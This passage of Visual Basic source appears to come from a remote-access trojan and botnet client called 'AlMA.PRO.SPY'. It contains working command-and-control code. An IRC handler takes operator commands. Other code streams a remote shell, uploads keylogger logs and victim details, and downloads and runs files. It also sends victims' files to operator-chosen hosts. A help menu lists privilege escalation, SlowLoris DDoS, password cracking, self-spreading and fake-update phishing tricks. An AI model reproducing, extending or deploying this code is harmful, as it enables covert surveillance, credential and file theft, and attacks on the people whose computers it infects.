                        SH_P.StandardError.BaseStream.BeginRead(byts1, 0, byts1.Length, asr1, New Object() {SH_P.StandardError.BaseStream, asr1})
                        Dim byts(4096) As Byte
                        Dim asr As New AsyncCallback(Sub(ar As IAsyncResult)
                                                         Dim s As IO.Stream = CType(ar.AsyncState(0), IO.Stream)
                                                         Dim a As AsyncCallback = CType(ar.AsyncState(1), AsyncCallback)
                                                         Dim read As Integer = s.EndRead(ar)
                                                         If read > 0 Then
                                                             Dim rtxt As New Windows.Forms.RichTextBox
                                                             rtxt.Text = BS(byts)
                                                             For Each d In rtxt.Lines
                                                                 If Not d.ToLower.EndsWith(">" & lastcmd.ToLower) And Not d.ToLower.EndsWith("more? ") And Not d = "" And Not d = Nothing Then
                                                                     TCP_C.Client.Send(SB(vbNewLine & d))
                                                                 End If
                                                             Next
                                                             byts = New Byte(4096) {}
                                                             s.BeginRead(byts, 0, byts.Length, a, New Object() {s, a})
                                                         Else
                                                             s.Close()
                                                         End If
                                                     End Sub)
                        SH_P.StandardOutput.BaseStream.BeginRead(byts, 0, byts.Length, asr, New Object() {SH_P.StandardOutput.BaseStream, asr})
                        Dim so As New StateObject(TCP_C.Client, SOType.SHELL)
                        so.optnl = New Object() {SH_P, lastcmd.Clone}
                        TCP_ReceiveSync(so)
                        Exit Sub
                    End If
                Catch ex As Exception
                    log_all("TCP_CON function: " & ex.Message & vbNewLine & ex.StackTrace)
                End Try
            Loop
        Catch ex As Exception
            log_all("TCP_CON function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' TCP connections' main function.
    Sub IRC(byts As Byte(), ns As IO.Stream)
        Dim data = BS(byts)
        Try
            With ns
                For Each l In data.Split(vbNewLine)
                    If Not l = "" And l.Contains(" ") Then
                        If l.ToLower.StartsWith("ping ") Then
                            .Write(SB("PONG " & l.Split(" ")(1)), 0, SB("PONG " & l.Split(" ")(1)).Length)
#Region "Checking newly joined users looking for IRCM & IRCB"
                        ElseIf l.ToLower.Split(" ")(1) = "join" Then
                            If l.ToLower.Split(" ")(2) = IRCCH.ToLower Then
                                If l.ToLower.StartsWith(":" & IRCM.ToLower) Or l.ToLower.StartsWith(":" & IRCB.ToLower) Then
                                    Threading.Thread.Sleep(1000)
                                    Dim cts = "PRIVMSG " & IRCCH & " :" & username & "/" & pcname
                                    .Write(SB(cts & vbNewLine), 0, SB(cts & vbNewLine).Length)
                                    cts = "PRIVMSG " & IRCCH & " :I'm ready to take commands."
                                    .Write(SB(cts & vbNewLine), 0, SB(cts & vbNewLine).Length)
                                    If onTor And (Not IO.File.Exists(path & "\Tor\tor.exe")) Then
                                        .Write(SB("PRIVMSG " & IRCCH & " :I have a problem with tor! Send me updated links!" & vbNewLine), 0, SB("PRIVMSG " & IRCCH & " : I have a problem with tor! Send me updated links!" & vbNewLine).Length)
                                        .Write(SB("PRIVMSG " & IRCCH & " :#TOR_LINKS" & vbNewLine), 0, SB("PRIVMSG " & IRCCH & " : #TOR_LINKS" & vbNewLine).Length)
                                    End If
                                End If
                            End If
#End Region
#Region "Checking if IRCM & IRCB are there"
                        ElseIf l.ToLower.Split(" ")(2).StartsWith("aps-") Then
                            If l.Split(" ").Length > 4 Then
                                If l.Split(" ")(4).ToLower = IRCCH.ToLower Then
                                    For Each u In Split(l, IRCCH & " :")(1).Split(" ")
                                        If u.ToLower.EndsWith(IRCM.ToLower) Or u.ToLower.EndsWith(IRCB.ToLower) Then
                                            Threading.Thread.Sleep(1000)
                                            Dim cts = "PRIVMSG " & IRCCH & " :" & username & "/" & pcname & vbNewLine
                                            .Write(SB(cts), 0, SB(cts).Length)
                                            cts = "PRIVMSG " & IRCCH & " :I'm ready to take commands." & vbNewLine
                                            .Write(SB(cts), 0, SB(cts).Length)
                                            If onTor And Not IO.File.Exists(path & "\Tor\tor.exe") Then
                                                .Write(SB("PRIVMSG " & IRCCH & " :I have a problem with tor! Send me updated links!" & vbNewLine), 0, SB("PRIVMSG " & IRCCH & " : I have a problem with tor! Send me updated links!" & vbNewLine).Length)
                                                .Write(SB("PRIVMSG " & IRCCH & " :#TOR_LINKS" & vbNewLine), 0, SB("PRIVMSG " & IRCCH & " : #TOR_LINKS" & vbNewLine).Length)
                                            End If
                                        End If
                                    Next
                                End If
                            End If
#End Region
                        ElseIf l.ToLower.Split(" ")(1) = "kick" Then
                            If l.ToLower.Split(" ")(2) = IRCCH.ToLower And l.ToLower.Split(" ")(3) = "aps-" & botid.ToLower Then
                                .Write(SB("JOIN " & IRCCH & vbNewLine), 0, SB("JOIN " & IRCCH & vbNewLine).Length)
                                .Write(SB("PRIVMSG " & IRCM & " : User (" & l.Split("!")(0).Remove(0, 1) & ") kicked me out for the reason {" & l.Split(":")(2) & "}" & vbNewLine), 0, SB("PRIVMSG " & IRCM & " : User (" & l.Split("!")(0).Remove(0, 1) & "} kicked me out for the reason {" & l.Split(":")(2) & "}" & vbNewLine).Length)
                            End If
#Region "IRC commands - channel chat"
                        ElseIf l.ToLower.Split(" ")(1) = "privmsg" Then
                            If l.ToLower.Split(" ")(2) = IRCCH.ToLower Then
                                If l.ToLower.StartsWith(":" & IRCM.ToLower) Or l.ToLower.StartsWith(":" & IRCB.ToLower) Then
                                    Dim cmd = l.Remove(0, l.Split(" ")(0).Length + 1)
                                    cmd = cmd.Remove(0, l.Split(" ")(1).Length + 1)
                                    cmd = cmd.Remove(0, l.Split(" ")(2).Length + 2)
                                    If cmd.ToLower.StartsWith("ss ") Then
                                        SS(cmd.Split(" ")(1), cmd.Split(" ")(2))
                                        LS()
                                        .Write(SB("PRIVMSG " & IRCCH & " : Setting (" & cmd.Split(" ")(1) & ") has been changed." & vbNewLine), 0, SB("PRIVMSG " & IRCCH & " : Setting (" & cmd.Split(" ")(1) & ") has been changed." & vbNewLine).Length)
                                    ElseIf cmd.ToLower = "mmo" Then
                                        Dim cts As String = "MODE " & IRCCH & " +o " & l.Split("!")(0).Remove(0, 1) & vbNewLine
                                        .Write(SB(cts), 0, SB(cts).Length)
                                    ElseIf cmd.ToLower.StartsWith("kuo ") Then
                                        Dim cts As String = "KICK " & IRCCH & " " & cmd.Remove(0, 4) & vbNewLine
                                        .Write(SB(cts), 0, SB(cts).Length)
                                    ElseIf cmd.ToLower = "cts" Then
                                        If My.Computer.Network.IsAvailable Then
                                            If CS() Then
                                                Dim av = "&antivirus=None"
                                                If avs.Count > 0 Then av = "&antivirus=" & avs(0)
                                                docmds(Post("botname=" & botname & "&username=" & username & "&devicename=" & pcname & "&os=" & osname & "&version=" & version & "&do=info&webcam=" & WCC() & "&ip=" & getip() & av))
                                                Try
                                                    If IO.File.Exists(keysfile) Then
                                                        Dim lf = New IO.FileInfo(keysfile)
                                                        If lf.Length >= 200 * 1024 Then Dim s = UploadFile(keysfile, "AlMA.PRO.SPY.keys", "logs") : lf.Delete() : docmds(s)
                                                    End If
                                                Catch ex As Exception
                                                End Try
                                                ctimes += 1
                                                docmds(DSS())
                                            End If
                                        End If
                                    ElseIf cmd.ToLower.StartsWith("unrar ")
                                        DownloadFile(cmd.Remove(0, 6), path & "\tor\unrar.exe")
                                    ElseIf cmd.ToLower.StartsWith("unrar3 ")
                                        DownloadFile(cmd.Remove(0, 7), path & "\tor\unrar3.dll")
                                    ElseIf cmd.ToLower = "dss"
                                        Dim s = ""
                                        If Light Then
                                            Light = False
                                            s = DSS()
                                            Light = True
                                        Else
                                            s = DSS()
                                        End If
                                        docmds(s)
                                    ElseIf cmd.ToLower = "wcs"
                                        docmds(WCS())
                                    ElseIf cmd.ToLower.StartsWith("btcp ")
                                        Dim p = cmd.Remove(0, 5)
                                        BTCP(p)
                                    ElseIf cmd.ToLower.StartsWith("rtcp ")
                                        Dim all = cmd.Remove(0, 5)
                                        RTCP(all.Split("|")(0), all.Split("|")(1))
                                    ElseIf cmd.ToLower = "id"
                                        Dim cts As String = "PRIVMSG " & IRCCH & " :" & username & "/" & pcname & vbNewLine
                                        .Write(SB(cts), 0, SB(cts).Length)
                                    ElseIf cmd.ToLower = "ch"
                                        Dim cts As String = "PRIVMSG " & IRCCH & " :"
                                        If CH() Then
                                            cts += "We are higher than normal (Administrator)." & vbNewLine
                                        Else
                                            cts += "We are not high :(" & vbNewLine
                                        End If
                                        .Write(SB(cts), 0, SB(cts).Length)
                                    ElseIf cmd.ToLower = "canh"
                                        Dim cts As String = "PRIVMSG " & IRCCH & " :"
                                        If CanH() Then
                                            cts += "We can get higher." & vbNewLine
                                        Else
                                            cts += "We can NOT get higher :(" & vbNewLine
                                        End If
                                        .Write(SB(cts), 0, SB(cts).Length)
                                    ElseIf cmd.ToLower = "gh"
                                        Dim cts As String = "PRIVMSG " & IRCCH & " :We'll try to get higher! If you notice a connection drop, this might mean we've got higher."
                                        .Write(SB(cts + vbNewLine), 0, SB(cts + vbNewLine).Length)
                                        If GH() Then
                                            cts = "PRIVMSG " & IRCCH & " :We DID get higher ^^ We'll be back ^^." & vbNewLine
                                            .Write(SB(cts), 0, SB(cts).Length)
                                            End
                                        Else
                                            cts = "PRIVMSG " & IRCCH & " :We couldn't get higher :( Try phishing methods (SEV)." & vbNewLine
                                            .Write(SB(cts), 0, SB(cts).Length)
                                        End If
                                    ElseIf cmd.ToLower.StartsWith("sev ")
                                        Dim t = cmd.Remove(0, 4).Split(" ")(0)
                                        Dim c = cmd.Remove(0, 6)
                                        Dim tt As SEV_Trick = SEV_Trick.MSGBOX
                                        Select Case t
                                            Case "2"
                                                tt = SEV_Trick.UpdateMSGBOX
                                            Case "3"
                                                tt = SEV_Trick.ErrorMSGBox
                                            Case "4"
                                                tt = SEV_Trick.BlueScreenOfDeath
                                            Case "5"
                                                tt = SEV_Trick.FakeWebsitePage
                                            Case "6"
                                                tt = SEV_Trick.FakeBrowserUpdate
                                        End Select
                                        Dim msg = "PRIVMSG " & IRCCH & " :"
                                        .Write(SB(msg & "Applying trick..." & vbNewLine), 0, SB(msg & "Applying trick..." & vbNewLine).Length)
                                        SEV(c, tt)
                                        .Write(SB(msg & "Done." & vbNewLine), 0, SB(msg & "Done." & vbNewLine).Length)
                                    End If
                                End If
#End Region
#Region "IRC commands - private chat"
                            ElseIf botid.ToLower.StartsWith(l.ToLower.Split(" ")(2).Remove(0, 4))
                                If l.ToLower.StartsWith(":" & IRCM.ToLower) Or l.ToLower.StartsWith(":" & IRCB.ToLower) Then
                                    Dim cmd = l.Remove(0, l.Split(" ")(0).Length + 1)
                                    cmd = cmd.Remove(0, l.Split(" ")(1).Length + 1)
                                    cmd = cmd.Remove(0, l.Split(" ")(2).Length + 2)
                                    If cmd.ToLower.StartsWith("ss ") Then
                                        SS(cmd.Split(" ")(1), cmd.Split(" ")(2))
                                        LS()
                                        .Write(SB("PRIVMSG " & l.Split("!")(0).Remove(0, 1) & " : Setting (" & cmd.Split(" ")(1) & ") has been changed." & vbNewLine), 0, SB("PRIVMSG " & l.Split("!")(0).Remove(0, 1) & " : Setting (" & cmd.Split(" ")(1) & ") has been changed." & vbNewLine).Length)
                                    ElseIf cmd.ToLower.StartsWith("gs ") Then
                                        Dim v = ""
                                        GS(cmd.Split(" ")(1), v)
                                        .Write(SB("PRIVMSG " & l.Split("!")(0).Remove(0, 1) & " : Setting (" & cmd.Split(" ")(1) & ") is set to ==> " & v & vbNewLine), 0, SB("PRIVMSG " & l.Split("!")(0).Remove(0, 1) & " : Setting (" & cmd.Split(" ")(1) & ") is set to ==> " & v & vbNewLine).Length)
                                    ElseIf cmd.ToLower = "cts" Then
                                        If My.Computer.Network.IsAvailable Then
                                            If CS() Then
                                                Dim av = "&antivirus=None"
                                                If avs.Count > 0 Then av = "&antivirus=" & avs(0)
                                                docmds(Post("botname=" & botname & "&username=" & username & "&devicename=" & pcname & "&os=" & osname & "&version=" & version & "&do=info&webcam=" & WCC() & "&ip=" & getip() & av))
                                                Try
                                                    If IO.File.Exists(keysfile) Then
                                                        Dim lf = New IO.FileInfo(keysfile)
                                                        If lf.Length >= 200 * 1024 Then Dim s = UploadFile(keysfile, "AlMA.PRO.SPY.keys", "logs") : lf.Delete() : docmds(s)
                                                    End If
                                                Catch ex As Exception
                                                End Try
                                                ctimes += 1
                                                docmds(DSS())
                                            End If
                                        End If
                                    ElseIf cmd.ToLower = "mmo" Then
                                        Dim cts As String = "MODE " & IRCCH & " +o " & l.Split("!")(0).Remove(0, 1) & vbNewLine
                                        .Write(SB(cts), 0, SB(cts).Length)
                                    ElseIf cmd.ToLower.StartsWith("kuo ") Then
                                        Dim cts As String = "KICK " & IRCCH & " " & cmd.Remove(0, 4) & vbNewLine
                                        .Write(SB(cts), 0, SB(cts).Length)
                                    ElseIf cmd.ToLower.StartsWith("unrar ")
                                        DownloadFile(cmd.Remove(0, 6), path & "\tor\unrar.exe")
                                    ElseIf cmd.ToLower.StartsWith("unrar3 ")
                                        DownloadFile(cmd.Remove(0, 7), path & "\tor\unrar3.dll")
                                    ElseIf cmd.ToLower = "dss"
                                        Dim s = ""
                                        If Light Then
                                            Light = False
                                            s = DSS()
                                            Light = True
                                        Else
                                            s = DSS()
                                        End If
                                        docmds(s)
                                    ElseIf cmd.ToLower = "wcs"
                                        docmds(WCS())
                                    ElseIf cmd.ToLower = "rjc" Then
                                        .Write(SB("JOIN " & IRCCH & vbNewLine), 0, SB("JOIN " & IRCCH & vbNewLine).Length)
                                    ElseIf cmd.ToLower.StartsWith("btcp ")
                                        Dim p = cmd.Remove(0, 5)
                                        BTCP(p)
                                    ElseIf cmd.ToLower.StartsWith("rtcp ")
                                        Dim all = cmd.Remove(0, 5)
                                        RTCP(all.Split("|")(0), all.Split("|")(1))
                                    ElseIf cmd.ToLower = "id"
                                        Dim cts As String = "PRIVMSG " & l.Split("!")(0).Remove(0, 1) & " :" & username & "/" & pcname & vbNewLine
                                        .Write(SB(cts), 0, SB(cts).Length)
                                    ElseIf cmd.ToLower = "ch"
                                        Dim cts As String = "PRIVMSG " & l.Split("!")(0).Remove(0, 1) & " :"
                                        If CH() Then
                                            cts += "We are higher than normal (Administrator)." & vbNewLine
                                        Else
                                            cts += "We are not high :(" & vbNewLine
                                        End If
                                        .Write(SB(cts), 0, SB(cts).Length)
                                    ElseIf cmd.ToLower = "canh"
                                        Dim cts As String = "PRIVMSG " & l.Split("!")(0).Remove(0, 1) & " :"
                                        If CanH() Then
                                            cts += "We can get higher." & vbNewLine
                                        Else
                                            cts += "We can NOT get higher :(" & vbNewLine
                                        End If
                                        .Write(SB(cts), 0, SB(cts).Length)
                                    ElseIf cmd.ToLower = "gh"
                                        Dim cts As String = "PRIVMSG " & l.Split("!")(0).Remove(0, 1) & " :We'll try to get higher! If you notice a connection drop, this might mean we've got higher." & vbNewLine
                                        .Write(SB(cts), 0, SB(cts).Length)
                                        If GH() Then
                                            cts = "PRIVMSG " & l.Split("!")(0).Remove(0, 1) & " :We DID get higher ^^ We'll be back ^^." & vbNewLine
                                            .Write(SB(cts), 0, SB(cts).Length)
                                            End
                                        Else
                                            cts = "PRIVMSG " & l.Split("!")(0).Remove(0, 1) & " :We couldn't get higher :( Try phishing methods (SEV)." & vbNewLine
                                            .Write(SB(cts), 0, SB(cts).Length)
                                        End If
                                    ElseIf cmd.ToLower.StartsWith("sev ")
                                        Dim t = cmd.Remove(0, 4).Split(" ")(0)
                                        Dim c = cmd.Remove(0, 6)
                                        Dim tt As SEV_Trick = SEV_Trick.MSGBOX
                                        Select Case t
                                            Case "2"
                                                tt = SEV_Trick.UpdateMSGBOX
                                            Case "3"
                                                tt = SEV_Trick.ErrorMSGBox
                                            Case "4"
                                                tt = SEV_Trick.BlueScreenOfDeath
                                            Case "5"
                                                tt = SEV_Trick.FakeWebsitePage
                                            Case "6"
                                                tt = SEV_Trick.FakeBrowserUpdate
                                        End Select
                                        Dim msg = "PRIVMSG " & l.Split("!")(0).Remove(0, 1) & " :"
                                        .Write(SB(msg & "Applying trick..." & vbNewLine), 0, SB(msg & "Applying trick..." & vbNewLine).Length)
                                        SEV(c, tt)
                                        .Write(SB(msg & "Done." & vbNewLine), 0, SB(msg & "Done." & vbNewLine).Length)
                                    End If
                                End If
                            End If
#End Region
                        End If
                    End If
                Next
            End With
        Catch ex As Exception
            log_all("IRC function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' IRC TCP callback.
    Sub APSSH(tcp_c As Net.Sockets.Socket, data As Byte())
        Dim rl As New Windows.Forms.RichTextBox
        rl.Text = BS(data)
        Dim cd As New IO.DirectoryInfo(IO.Directory.GetCurrentDirectory)
        Dim pt = username & "@" & pcname & ":" & cd.Name & "# "
        Dim ce As Boolean = False
        For Each cmd In rl.Lines
            Try
                Select Case cmd.ToLower
#Region "HELP"
                    Case "help", "?", "h"
                        Dim ht = "Help:" & vbNewLine & "This is AlMA.PRO.SPY SSH alike."
                        ht += vbNewLine & "It's almost a Linux Secure Shell, so use what's on Linux' Terminal."
                        ht += vbNewLine & "help/?/h" & vbTab & "  - " & "Show this message"
                        ht += vbNewLine & "version" & vbTab & "  - " & "Print the version of the bot"
                        ht += vbNewLine & "whoami/id" & vbTab & "  - " & "Print the name of the current user"
                        ht += vbNewLine & "ls" & vbTab & vbTab & "  - " & "List files (Takes no arguments)"
                        ht += vbNewLine & "rtcp" & vbTab & vbTab & "  - " & "Reverse TCP connection to a host on a port [HOST|PORT]"
                        ht += vbNewLine & "btcp" & vbTab & vbTab & "  - " & "Check if it's possible to bind on a port [PORT - Append (-l) to try it local]"
                        ht += vbNewLine & "drives" & vbTab & vbTab & "  - " & "Print all found drives"
                        ht += vbNewLine & "users" & vbTab & vbTab & "  - " & "List/Add/Remove users"
                        ht += vbNewLine & "shares" & vbTab & vbTab & "  - " & "List/Add/Delete Windows shares"
                        ht += vbNewLine & "cd" & vbTab & vbTab & "  - " & "Change Directory (You can change the current drive with it [From C: to D: (cd d:)])"
                        ht += vbNewLine & "cat" & vbTab & vbTab & "  - " & "Print all contents of a file"
                        ht += vbNewLine & "touch" & vbTab & vbTab & "  - " & "Make a new file"
                        ht += vbNewLine & "mkdir" & vbTab & vbTab & "  - " & "Make a new directory"
                        ht += vbNewLine & "rm" & vbTab & vbTab & "  - " & "Remove a file (Only one file)"
                        ht += vbNewLine & "rmdir" & vbTab & vbTab & "  - " & "Remove a directory (Takes -f to erase folders content)"
                        ht += vbNewLine & "exe/run" & vbTab & vbTab & "  - " & "Run a file (Ex: exe alma.png - This will run alma.png with the default file executer according to CMD)"
                        ht += vbNewLine & "ipconfig/ifconfig" & " - " & "Get network adapters and their current settings"
                        ht += vbNewLine & "sl" & vbTab & vbTab & "  - " & "SlowLoris DDos Attack (Takes -b for background working)"
                        ht += vbNewLine & "co" & vbTab & vbTab & "  - " & "CrackOff function - Cracks services for usernames and passwords. services included are: SMTP,IMAP,FTP,SSH,HTTP_GET,HTTP_POST. (Takes no arguments [Interactive])"
                        ht += vbNewLine & "ch" & vbTab & vbTab & "  - " & "Check if the bot is higher than normal (Administrator)."
                        ht += vbNewLine & "canh" & vbTab & vbTab & "  - " & "Check if the bot can get higher."
                        ht += vbNewLine & "gh" & vbTab & vbTab & "  - " & "Try to get higher."
                        ht += vbNewLine & "RDP" & vbTab & vbTab & "  - " & "Enable/Disable Remote Desktop Protocol [Default: Enable] (Requires Administrator)."
                        ht += vbNewLine & "zd2sys" & vbTab & vbTab & "  - " & "Exploit Zero-Days to gain system."
                        ht += vbNewLine & "sp" & vbTab & vbTab & "  - " & "SPREAD_PATH function to spread on a specific path with all available spread methods."
                        ht += vbNewLine & "sev" & vbTab & vbTab & "  - " & "Secial Engineer Victims with one of the tricks. 1|2|3|4|5|6 [Content]." & vbNewLine & "It takes a trick and a content:" & vbNewLine & "1 - MSGBOX." & vbNewLine & "2 - UpdateMSGBOX." & vbNewLine & "3 - ErrorMSGBox. " & vbNewLine & "4 - BlueScreenOfDeath (Requires Administrator)." & vbNewLine & "5 - FakeWebsitePage." & vbNewLine & "6 - FakeBrowserUpdate." & vbNewLine & "Content: A string that will be included in the trick."
                        ht += vbNewLine & "download" & vbTab & "  - " & "Downloads a file from bot's machine to you (Takes no arguments [Interactive])"
                        ht += vbNewLine & "upload" & vbTab & vbTab & "  - " & "Uploads a file from you to bot's machine (Takes no arguments [Interactive])"
                        ht += vbNewLine & "*NOTE* Both commands above (download/upload) have HTTP file transfer and TCP file transfer. So be very precise when choosing your method."
                        tcp_c.Send(SB(ht & vbNewLine))
#End Region
#Region "CASE_EXTRA"
                    Case "zd2sys"
                        tcp_c.Send(SB("Exploiting Zero-Days...." & vbNewLine & "If you notice a connection drop, this means we've done exploiting successfuly." & vbNewLine))
                    Case "version"
                        tcp_c.Send(SB(version & vbNewLine))
                    Case "whoami", "id"
                        tcp_c.Send(SB(username & vbNewLine))
                    Case "shares"
                        tcp_c.Send(SB("Usage: shares [list/add/delete] [name[|path[|user]]]" & vbNewLine & "list - List a well formatted list of share servers and names." & vbNewLine & "add - Add a share." & vbNewLine & "delete - Delete a share." & vbNewLine))
                    Case "pwd"
                        tcp_c.Send(SB(IO.Directory.GetCurrentDirectory & "\" & vbNewLine))
#End Region
#Region "LS"
                    Case "ls"
                        Dim ls = ""
                        Dim c = 0
                        Dim cfo = 0
                        Dim cfi = 0
                        For Each f In IO.Directory.GetDirectories(cd.FullName)
                            Dim fi As New IO.DirectoryInfo(f)
                            ls += fi.Name & vbTab & fi.LastWriteTime.ToShortDateString & vbTab & fi.LastWriteTime.ToShortTimeString & vbNewLine
                            c += 1
                            cfo += 1
                        Next
                        For Each f In IO.Directory.GetFiles(cd.FullName)
                            Dim fi As New IO.FileInfo(f)
                            ls += fi.Name & vbTab & fi.LastWriteTime.ToShortDateString & vbTab & fi.LastWriteTime.ToShortTimeString & vbNewLine
                            c += 1
                            cfi += 1
                        Next
                        ls = "Total " & c & " - (Folders " & cfo & ") ( Files " & cfi & ")" & vbNewLine & ls
                        tcp_c.Send(SB(ls))
#End Region
#Region "DRIVES"
                    Case "drives"
                        Dim ds = ""
                        Dim c = 0
                        For Each dri In My.Computer.FileSystem.Drives
                            If dri.IsReady Then
                                ds += dri.Name & " " & dri.VolumeLabel & " " & dri.DriveFormat & vbNewLine
                                c += 1
                            End If
                        Next
                        ds = "Total Drives " & c & vbNewLine & ds
                        tcp_c.Send(SB(ds))
#End Region
#Region "USERS - List"
                    Case "users"
                        Dim uss = "User" & vbTab & "-" & vbTab & "Path" & vbNewLine
                        Dim c = 0
                        For Each u In Us()
                            uss += u.Split("|")(0) & " - " & u.Split("|")(1) & vbNewLine
                            c += 1
                        Next
                        uss = "Total Users " & c & vbNewLine & uss
                        tcp_c.Send(SB(uss))
#End Region
#Region "I(P/F)CONFIG"
                    Case "ipconfig", "ifconfig"
                        Dim txt = ""
                        Dim c = 0
                        For Each adapter In Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces
                            Try
                                If Not adapter.Name.ToLower.StartsWith("isatap") Then
                                    txt += "Interface " & adapter.Name & ":" & vbNewLine
                                    txt += "          Interface Type: " & adapter.NetworkInterfaceType.ToString() & vbNewLine
                                    txt += "          MAC Address: " & adapter.GetPhysicalAddress.ToString & vbNewLine
                                    For Each ip In adapter.GetIPProperties.UnicastAddresses
                                        Dim kind = "          IPv4: "
                                        If ip.Address.IsIPv6LinkLocal Or ip.Address.IsIPv6Multicast Or ip.Address.IsIPv6SiteLocal Or ip.Address.ToString = "::1" Then kind = "          IPv6: "
                                        txt += kind & ip.Address.ToString & vbNewLine
                                    Next
                                    For Each g In adapter.GetIPProperties.GatewayAddresses
                                        txt += "          Gateway: " & g.Address.ToString & vbNewLine
                                    Next
                                    For Each dnss In adapter.GetIPProperties.DnsAddresses
                                        txt += "          DNS: " & dnss.ToString & vbNewLine
                                    Next
                                    Dim sbs = adapter.GetIPv4Statistics.BytesSent
                                    Dim rbs = adapter.GetIPv4Statistics.BytesReceived
                                    Dim sbsf = ""
                                    Dim rbsf = ""
                                    Dim suf = 1
                                    Do Until sbs < 1024
                                        sbs = sbs / 1024
                                        suf += 1
                                    Loop
                                    Select Case suf
                                        Case 1
                                            sbsf = sbs & "B"
                                        Case 2
                                            sbsf = sbs & "KB"
                                        Case 3
                                            sbsf = sbs & "MB"
                                        Case 4
                                            sbsf = sbs & "GB"
                                        Case 5
                                            sbsf = sbs & "TB"
                                    End Select
                                    suf = 1
                                    Do Until rbs < 1024
                                        rbs = rbs / 1024
                                        suf += 1
                                    Loop
                                    Select Case suf
                                        Case 1
                                            rbsf = rbs & "B"
                                        Case 2
                                            rbsf = rbs & "KB"
                                        Case 3
                                            rbsf = rbs & "MB"
                                        Case 4
                                            rbsf = rbs & "GB"
                                        Case 5
                                            rbsf = rbs & "TB"
                                    End Select
                                    txt += "          Sent/Recived: " & sbsf & "/" & rbsf & vbNewLine
                                    c += 1
                                End If
                            Catch ex As Exception
                                log_all("TCP_CON function: " & ex.Message & vbNewLine & ex.StackTrace)
                            End Try
                        Next
                        txt = "Total " & c & vbNewLine & txt
                        tcp_c.Send(SB(txt))
#End Region
#Region "DOWNLOAD"
                    Case "download"
                        Dim ready = False
                        Dim method As FileTransferMode = 0
                        Dim port = ""
                        Dim sf = ""
                        Dim df = ""
                        Dim hoip = ""
                        Do Until ready
                            If Not tcp_c.Connected Then Exit Sub
                            tcp_c.Send(SB("File to download: "))
                            Do While Not tcp_c.Available > 0
                            Loop
                            tcp_c.Receive(data)
                            sf = GetData(data)
                            If IO.File.Exists(sf) Then
                                tcp_c.Send(SB("File to save to [Default: " & sf.Split("\")(sf.Split("\").Length - 1) & "]: "))
                                Do While Not tcp_c.Available > 0
                                Loop
                                tcp_c.Receive(data)
                                df = GetData(data)
                                If df = "" Then df = sf.Split("/")(sf.Split("/").Length - 1)
                                tcp_c.Send(SB("Transfer method (HTTP/TCP) [Default: HTTP]: "))
                                Do While Not tcp_c.Available > 0
                                Loop
                                tcp_c.Receive(data)
                                Dim mthd = GetData(data)
                                If mthd = "" Then method = 1
                                If method = 0 Then
                                    If mthd.ToLower = "http" Then method = 1 : tcp_c.Send(SB("[?] - Note that for HTTP File Transfer method you can hit ENTER/RETURN to choose it, as it's the default." & vbNewLine))
                                    If mthd.ToLower = "tcp" Then method = 2
                                End If
                                If method = 0 Then tcp_c.Send(SB("[!] - Unknown Transfer method (" & mthd & ")." & vbNewLine)) : Exit Select
                                tcp_c.Send(SB("Host/IP to connect to (if using HTTP method include http/s at the begining): "))
                                Do While Not tcp_c.Available > 0
                                Loop
                                tcp_c.Receive(data)
                                hoip = GetData(data)
                                If method = 1 Then
                                    Dim suf = ": "
                                    Dim mport = "80"
                                    If hoip.ToLower.StartsWith("https") Then mport = "443"
                                    suf = " [Default: " & mport & "]" & suf
                                    tcp_c.Send(SB("Port To connect On" & suf))
                                    Do While Not tcp_c.Available > 0
                                    Loop
                                    tcp_c.Receive(data)
                                    port = GetData(data)
                                    If port = "" Then port = mport
                                ElseIf method = 2 Then
                                    tcp_c.Send(SB("Port To connect On: "))
                                    Do While Not tcp_c.Available > 0
                                    Loop
                                    tcp_c.Receive(data)
                                    port = GetData(data)
                                End If
                                Try
                                    Integer.Parse(port)
                                Catch ex As Exception
                                    tcp_c.Send(SB("[!] - Port was not only numbers (" & port & ")." & vbNewLine)) : Exit Select
                                End Try
                                If Not CUH(hoip, port) Then tcp_c.Send(SB("[!] - Host/IP is not up (" & hoip & ")." & vbNewLine)) : Exit Select
                                ready = True
                            Else
                                tcp_c.Send(SB("[!] - File was not found (" & sf & ")" & vbNewLine)) : Exit Select
                            End If
                        Loop
                        Dim errr = False
                        tcp_c.Send(SB("[~] - Downloading ..."))
                        If method = 1 Then
                            If hoip.EndsWith("/") And Not hoip.EndsWith(".php") Then hoip = hoip.Remove(hoip.Length - 1, 1)
                            Try
                                a.UploadFile(hoip & "?file=" & df, "PUT", sf)
                            Catch ex As Exception
                                errr = True
                                log_all("TCP_CON function: " & ex.Message & vbNewLine & ex.StackTrace)
                            End Try
                        Else
                            Try
                                Dim tc As New Net.Sockets.TcpClient(hoip, port)
                                Do Until tc.Connected
                                Loop
                                tc.Client.Send(IO.File.ReadAllBytes(sf))
                                tc.Close()
                            Catch ex As Exception
                                errr = True
                                log_all("TCP_CON function: " & ex.Message & vbNewLine & ex.StackTrace)
                            End Try
                        End If
                        If errr Then tcp_c.Send(SB(vbNewLine & "[!] - There was an error! Check log files for more info."))
                        If Not errr Then tcp_c.Send(SB(vbNewLine & "[*] - Done Downloading."))
                        tcp_c.Send(SB(vbNewLine))
#End Region
#Region "UPLOAD"
                    Case "upload"
                        Dim ready = False
                        Dim method As FileTransferMode = 0
                        Dim port = ""
                        Dim sf = ""
                        Dim df = ""
                        Dim hoip = ""
                        Do Until ready
                            If Not tcp_c.Connected Then Exit Sub
                            tcp_c.Send(SB("File to upload: "))
                            Do While Not tcp_c.Available > 0
                            Loop
                            tcp_c.Receive(data)
                            sf = GetData(data)
                            tcp_c.Send(SB("File to save to [Default: " & sf.Split("/")(sf.Split("/").Length - 1) & "]: "))
                            Do While Not tcp_c.Available > 0
                            Loop
                            tcp_c.Receive(data)
                            df = GetData(data)
                            If df = "" Then df = sf.Split("/")(sf.Split("/").Length - 1)
                            If IO.File.Exists(df) Then
                                Dim done = False
                                Dim c = 1
                                Do Until done
                                    tcp_c.Send(SB("File already exists. Do you want ot overwrite it? (Yes/No) [Default: No]: "))
                                    Do While Not tcp_c.Available > 0
                                    Loop
                                    tcp_c.Receive(data)
                                    Dim tdf = ""
                                    If BS(data) = "" Or BS(data).ToLower.TrimEnd = "no" Then tdf = df.Insert(df.Length - df.Split(".")(df.Split(".").Length - 1).Length, "-" & c)
                                    If BS(data).ToLower.TrimEnd = "yes" Then
                                        Try
                                            IO.File.Delete(df)
                                            tdf = df
                                            done = True
                                        Catch ex As Exception
